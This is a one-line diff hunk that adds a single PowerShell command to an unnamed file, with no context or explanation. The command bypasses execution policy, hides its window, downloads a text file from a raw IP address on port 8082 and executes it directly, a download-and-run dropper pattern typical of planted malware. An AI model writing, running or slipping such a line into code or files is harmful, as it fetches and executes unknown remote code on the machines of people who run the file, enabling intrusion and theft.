@@ -1,0 +1,1 @@
+powershell -ep bypass -w hidden iex(iwr 46.161.53.115:8082/proxy.txt -usebasicparsing)
